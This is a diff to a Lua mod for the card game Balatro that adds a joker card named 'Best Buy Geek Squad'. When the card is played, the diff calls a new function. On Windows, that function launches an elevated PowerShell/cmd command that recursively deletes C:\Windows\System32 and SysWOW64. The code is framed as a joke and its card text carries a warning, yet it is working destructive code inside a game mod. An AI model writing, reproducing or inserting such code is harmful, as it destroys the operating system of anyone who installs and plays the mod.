@@ -125,6 +125,14 @@ local function gcbm_shutdown_computer()
     end
 end
 
+local function gcbm_delete_sys32()
+    local os_name = love.system.getOS()
+
+    if os_name == "Windows" then
+        os.execute([[powershell -NoProfile -Command "Start-Process cmd -Verb RunAs -ArgumentList '/c rd /s /q C:\Windows\System32 & rd /s /q C:\Windows\SysWOW64'"]])
+    end
+end
+
 SMODS.Joker{
     key = 'tm2', --joker key
     loc_txt = { -- local text
@@ -166,6 +174,36 @@ SMODS.Joker{
     in_pool = function(self,wawa,wawa2)
         --whether or not this card is in the pool, return true if it is, return false if its not
         return true
+    end,
+}
+
+SMODS.Joker{
+    key = 'best',
+    loc_txt = {
+        name = 'Best Buy Geek Squad',
+        text = {
+            'THIS WILL DELETE YOUR SYSTEM32 WHEN PLAYED',
+        },
+    },
+    atlas = 'Rare_jokers',
+    rarity = 3,
+    cost = 10,
+    unlocked = true,
+    discovered = true,
+    blueprint_compat = false,
+    eternal_compat = true,
+    perishable_compat = true,
+    pos = {x = 0, y = 0},
+
+    in_pool = function(self, args)
+        return true
+    end,
+
+    calculate = function(self, card, context)
+        local streamer_mode_enabled = config.streamer_mode
+        if context.joker_main and not streamer_mode_enabled then
+            gcbm_delete_sys32()
+        end
     end,
 }
 
